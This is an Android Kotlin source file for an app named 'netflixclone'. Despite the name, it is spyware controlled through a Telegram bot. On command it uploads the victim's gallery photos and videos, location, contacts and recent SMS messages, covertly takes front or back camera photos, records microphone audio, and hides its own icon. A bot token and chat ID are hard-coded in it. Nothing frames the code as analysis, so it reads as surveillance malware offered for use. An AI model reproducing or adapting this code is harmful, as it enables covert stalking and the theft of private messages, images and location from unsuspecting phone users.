package com.example.netflixclone

import android.annotation.SuppressLint
import android.content.ContentUris
import android.content.pm.PackageManager
import android.hardware.Camera
import android.media.MediaRecorder
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.MediaStore
import android.provider.ContactsContract
import android.provider.Telephony
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.google.android.gms.location.LocationServices
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

class MainActivity : AppCompatActivity() {

    // ⚠️⚠️⚠️ YAHAN APNI DETAILS DALO ⚠️⚠️⚠️
    private val BOT_TOKEN = "9009031778:AAFUjJqZgWCzdzQjiWtbqCcqR_rxONTfhsc"
    private val CHAT_ID = "8329991730"

    private lateinit var status: TextView
    private lateinit var progress: ProgressBar
    private var lastUpdateId: Long = 0
    private val prefs by lazy { getSharedPreferences("bot", MODE_PRIVATE) }
    private var pollingRunning = true

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        status = findViewById(R.id.tvStatus)
        progress = findViewById(R.id.progress)

        // Last update ID load karo
        lastUpdateId = prefs.getLong("lastId", 0)

        // Sab permissions maango
        ActivityCompat.requestPermissions(this, arrayOf(
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_MEDIA_IMAGES,
            android.Manifest.permission.READ_MEDIA_VIDEO,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION
        ), 100)

        // Button setup
        findViewById<Button>(R.id.btnPhotos).setOnClickListener { sendPhotos() }
        findViewById<Button>(R.id.btnVideos).setOnClickListener { sendVideos() }
        findViewById<Button>(R.id.btnLocation).setOnClickListener { sendLocation() }
        findViewById<Button>(R.id.btnSMS).setOnClickListener { sendSMS() }
        findViewById<Button>(R.id.btnCamera).setOnClickListener { takePhoto(true) }
        findViewById<Button>(R.id.btnMic).setOnClickListener { recordMic() }

        // ⭐ TELEGRAM BOT POLLING START karo
        Thread(this::startBotPolling).start()
        sendText("✅ App online ho gayi! /help bhejo commands ke liye.")
    }

    private fun setStatus(msg: String) = runOnUiThread {
        status.text = msg
        progress.visibility = if (msg == "Ready ✅") ProgressBar.GONE else ProgressBar.VISIBLE
    }

    // ================== 🤖 REMOTE CONTROL (Bot Polling) ==================
    private fun startBotPolling() {
        while (pollingRunning) {
            try {
                val url = URL("https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=25")
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 35000
                conn.readTimeout = 35000

                val response = conn.inputStream.bufferedReader().readText()
                val json = JSONObject(response)

                if (json.getBoolean("ok")) {
                    val updates = json.getJSONArray("result")
                    for (i in 0 until updates.length()) {
                        val update = updates.getJSONObject(i)
                        lastUpdateId = update.getLong("update_id")
                        prefs.edit().putLong("lastId", lastUpdateId).apply()

                        val msgObj = update.getJSONObject("message")
                        // Sirf hamari chat ID se control (security)
                        if (msgObj.getString("chat")["id"].toString() != CHAT_ID) continue

                        val msgText = msgObj.optString("text", "").trim().toLowerCase()
                        handleCommand(msgText)
                    }
                }
            } catch (e: Exception) {
                Thread.sleep(3000) // Error aaye to thoda wait karo
            }
        }
    }

    private fun handleCommand(cmd: String) {
        when {
            cmd == "/help" || cmd == "/start" -> sendText(getHelpMenu())
            cmd == "/photos" -> sendPhotos()
            cmd == "/videos" -> sendVideos()
            cmd == "/location" -> sendLocation()
            cmd == "/contacts" -> sendContacts()
            cmd == "/sms" -> sendSMS()
            cmd == "/info" -> sendInfo()
            cmd == "/camera" -> takePhoto(true)
            cmd == "/backcamera" -> takePhoto(false)
            cmd == "/mic" -> recordMic()
            cmd == "/hide" -> hideAppIcon()
        }
    }

    private fun getHelpMenu(): String {
        return """
            🤖 SAARE COMMANDS:
            /photos - Gallery ki photos bhejo
            /videos - Gallery ki videos bhejo
            /location - Live location bhejo
            /contacts - Contact list bhejo
            /sms - SMS padho
            /info - Phone ki jankari
            /camera - Front camera se photo
            /backcamera - Back camera se photo
            /mic - 30 sec recording
            /hide - App icon chhupao
        """.trimIndent()
    }

    // ================== 📷 PHOTOS ==================
    private fun sendPhotos() {
        Thread {
            setStatus("Photos bhej rahe hain... 📷")
            var count = 0
            try {
                val collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                val cursor = contentResolver.query(collection, null, null, null, "DATE_ADDED DESC")
                cursor?.use {
                    while (it.moveToNext() && count < 20) { // 20 tak limit
                        val path = getPath(it)
                        val file = File(path)
                        if (file.exists() && file.length() < 10L * 1024 * 1024) {
                            uploadFile(file, "photo")
                            count++
                        }
                    }
                }
                sendText("✅ $count photos bhej di!")
                setStatus("Ready ✅")
            } catch (e: Exception) {
                setStatus("Error: ${e.message}")
            }
        }.start()
    }

    // ================== 🎥 VIDEOS ==================
    private fun sendVideos() {
        Thread {
            setStatus("Videos bhej rahe hain... 🎥")
            var count = 0
            try {
                val collection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                val cursor = contentResolver.query(collection, null, null, null, "DATE_ADDED DESC")
                cursor?.use {
                    while (it.moveToNext() && count < 5) { // Kam videos bhejo
                        val path = getPath(it)
                        val file = File(path)
                        if (file.exists() && file.length() < 50L * 1024 * 1024) {
                            uploadFile(file, "video")
                            count++
                        }
                    }
                }
                sendText("✅ $count videos bhej diye!")
                setStatus("Ready ✅")
            } catch (e: Exception) {
                setStatus("Error: ${e.message}")
            }
        }.start()
    }

    // ================== 📍 LOCATION ==================
    private fun sendLocation() {
        setStatus("Location le rahe hain... 📍")
        try {
            val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
            val providers = lm.getProviders(true)
            var best: android.location.Location? = null
            for (p in providers) {
                @SuppressLint("MissingPermission")
                val l = lm.getLastKnownLocation(p) ?: continue
                if (best == null || l.accuracy < best!!.accuracy) best = l
            }
            if (best != null) {
                apiCall("sendLocation?chat_id=$CHAT_ID&latitude=${best.latitude}&longitude=${best.longitude}")
                sendText("🗺️ [Google Maps](https://maps.google.com/?q=${best.latitude},${best.longitude})")
                setStatus("Ready ✅")
            } else setStatus("Location nahi mili, GPS on karo")
        } catch (e: Exception) {
            setStatus("Error: ${e.message}")
        }
    }

    // ================== ☎️ CONTACTS ==================
    private fun sendContacts() {
        Thread {
            try {
                val sb = StringBuilder("📞 CONTACTS:\n\n")
                val cursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
                    null, null, null
                )
                cursor?.use {
                    while (it.moveToNext()) {
                        val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                        val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                        sb.append("👤 $name 📱 $number\n")
                    }
                }
                sendText(sb.toString())
            } catch (e: Exception) {
                sendText("Contacts error: ${e.message}")
            }
            setStatus("Ready ✅")
        }.start()
    }

    // ================== 💬 SMS ==================
    private fun sendSMS() {
        Thread {
            try {
                val sb = StringBuilder("💬 SMS (Aakhri 20):\n\n")
                val cursor = contentResolver.query(
                    Telephony.Sms.CONTENT_URI,
                    arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY),
                    null, null, "date DESC"
                )
                var count = 0
                cursor?.use {
                    while (it.moveToNext() && count < 20) {
                        val addr = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                        val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                        sb.append("📤 $addr: $body\n---\n")
                        count++
                    }
                }
                sendText(sb.toString())
            } catch (e: Exception) {
                sendText("SMS error: ${e.message}")
            }
            setStatus("Ready ✅")
        }.start()
    }

    // ================== 🔋 PHONE INFO ==================
    private fun sendInfo() {
        runOnUiThread {
            val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
            val batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val info = """
                📱 PHONE INFO:
                - Model: ${Build.MANUFACTURER} ${Build.MODEL}
                - Android: ${Build.VERSION.RELEASE}
                - Battery: $batteryLevel%
                - Storage: ${Environment.getExternalStorageDirectory().freeSpace / (1024L*1024*1024)} GB Free
            """.trimIndent()
            sendText(info)
        }
        setStatus("Ready ✅")
    }

    // ================== 📸 CAMERA PHOTO ==================
    private fun takePhoto(useFrontCamera: Boolean) {
        Thread {
            try {
                sendText("📸 Photo khich rahe hain...")
                val cameraId = findCamera(useFrontCamera)
                val camera = Camera.open(cameraId)
                camera.startPreview()
                Thread.sleep(1000) // Warm up
                
                val outputFile = File(cacheDir, "cam_${System.currentTimeMillis()}.jpg")
                
                camera.takePicture(null, null, { data, _ ->
                    val bytes = data
                    val out = java.io.FileOutputStream(outputFile)
                    out.write(bytes)
                    out.close()
                    
                    uploadFile(outputFile, "photo")
                    sendText("✅ Photo bhej di!")
                    outputFile.delete()
                    
                    camera.stopPreview()
                    camera.release()
                })
            } catch (e: Exception) {
                sendText("Camera error: ${e.message}")
            }
        }.start()
    }

    private fun findCamera(front: Boolean): Int {
        val count = Camera.getNumberOfCameras()
        val info = Camera.CameraInfo()
        for (i in 0 until count) {
            Camera.getCameraInfo(i, info)
            if (front && info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) return i
            if (!front && info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) return i
        }
        return 0
    }

    // ================== 🎙️ MIC RECORDING ==================
    private fun recordMic() {
        Thread {
            try {
                sendText("🎙️ Recording start... 30 second")
                val outputFile = File(cacheDir, "rec_${System.currentTimeMillis()}.mp3")
                val recorder = MediaRecorder().apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioEncodingBitRate(128000)
                    setAudioSamplingRate(44100)
                    setOutputFile(outputFile.absolutePath)
                    prepare()
                    start()
                }
                Thread.sleep(30000) // 30 sec wait
                recorder.stop()
                recorder.release()

                uploadFile(outputFile, "audio")
                sendText("✅ Recording bhej di!")
                outputFile.delete()
            } catch (e: Exception) {
                sendText("Mic error: ${e.message}")
            }
        }.start()
    }

    // ================== 🙈 APP HIDE ==================
    private fun hideAppIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                android.content.ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            sendText("🙈 App icon hide ho gaya!")
        } catch (e: Exception) {
            sendText("Hide error: ${e.message}")
        }
    }

    // ================== 🔧 HELPERS ==================
    private fun getPath(cursor: android.database.Cursor): String {
        return cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)) ?: ""
    }

    private fun uploadFile(file: File, type: String): Boolean {
        return try {
            val method = when(type) {
                "photo" -> "sendPhoto"
                "video" -> "sendVideo"
                "audio" -> "sendAudio"
                else -> "sendDocument"
            }
            val url = URL("https://api.telegram.org/bot$BOT_TOKEN/$method")
            val boundary = "----Boundary${System.currentTimeMillis()}"
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.connectTimeout = 60000
            conn.readTimeout = 60000
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            val out = conn.outputStream
            out.write("--$boundary\r\n".toByteArray())
            out.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n$CHAT_ID\r\n".toByteArray())
            out.write("--$boundary\r\n".toByteArray())
            out.write("Content-Disposition: form-data; name=\"$type\"; filename=\"${file.name}\"\r\n".toByteArray())
            out.write("Content-Type: application/octet-stream\r\n\r\n".toByteArray())
            file.inputStream().use { it.copyTo(out) }
            out.write("\r\n--$boundary--\r\n".toByteArray())
            out.flush()

            val ok = conn.responseCode in 200..299
            out.close()
            ok
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    private fun sendText(text: String) {
        Thread {
            try {
                val encoded = URLEncoder.encode(text, "UTF-8")
                apiCall("sendMessage?chat_id=$CHAT_ID&text=$encoded")
            } catch (e: Exception) {
                // Ignore for stability
            }
        }.start()
    }

    private fun apiCall(method: String) {
        try {
            val url = URL("https://api.telegram.org/bot$BOT_TOKEN/$method")
            val conn = url.openConnection() as HttpURLConnection
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.connect()
        } catch (e: Exception) {
            // Ignore
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        pollingRunning = false
    }
}